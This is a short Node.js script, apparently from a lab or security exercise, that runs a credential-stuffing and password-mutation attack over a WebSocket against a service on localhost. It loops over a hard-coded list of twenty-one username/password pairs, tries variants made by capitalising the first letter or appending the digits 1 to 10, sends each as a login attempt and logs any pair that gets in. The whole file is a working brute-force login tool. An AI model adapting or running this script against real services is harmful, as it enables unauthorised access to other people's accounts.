const WebSocket = require('ws');

const credentials = {
    "amanda_smith": "Sm1th2024!",
    "nathan_baker": "B@k3rN@than",
    "grace_taylor": "Gr@ceT@ylor123",
    "daniel_walker": "W@lk3rDan1el",
    "ava_martin": "M@rtinAv@",
    "ethan_harris": "H@rrisEthan!",
    "mia_thompson": "Th0mpsonM1a",
    "william_anderson": "Anders0nWill1am",
    "natalie_wright": "Wr1ghtNat@lie",
    "james_evans": "Ev@nsJam3s",
    "sophia_hall": "H@llSophia",
    "michael_johnson": "J0hns0nM1chael!",
    "emma_davis": "D@visEmm@123",
    "ryan_miller": "M1llerRy@n2024",
    "olivia_rodriguez": "R0driguezOl1via",
    "jack_hernandez": "H3rnandezJack!",
    "isabella_lewis": "L3w1sIs@bell@",
    "noah_taylor": "N0@hT@ylor",
    "samantha_martinez": "M@rtinezS@manth@",
    "william_robinson": "R0b!nsonWill",
    "aaa": "aaa",
  };

function capitalizeFirstLetter(password) {
    return password.charAt(0).toUpperCase() + password.slice(1);
}


for (let username in credentials) {
    for (let i = -1; i <= 10; i++) {
        class WebSocketClient {
            constructor(url) {
                this.url = url;
                this.socket = new WebSocket(url);
        
                this.socket.on('open', () => {
                    console.log('WebSocket connection established.');
                });
        
                this.socket.on('message', (data) => {
                    const message = JSON.parse(data);
                    let password = credentials[username]
                    console.log('Message received from server:', message);

                    switch (i) {
                        case -1:
                            break;
                        case 0:
                            password = capitalizeFirstLetter(password)
                            break;
                        default:
                            password += i
                      }

                    if (message.action === 'checkRegistration') {
                        this.send({ action: 'login', username: username, password: password});
                    }

                    if (message.action === 'viewFeedAndUser') {
                        console.log("Found matched credentials:")
                        console.log(username)
                        console.log(password)
                    }
                });
        
                this.socket.on('close', () => {
                    console.log('WebSocket connection closed.');
                });
        
                this.socket.on('error', (error) => {
                    console.error('WebSocket error:', error);
                });
            }
        
            send(data) {
                this.socket.send(JSON.stringify(data));
                console.log('Message sent to server:', data);
            }
        }
        const client = new WebSocketClient('ws://localhost:8100'); 
    }
    
}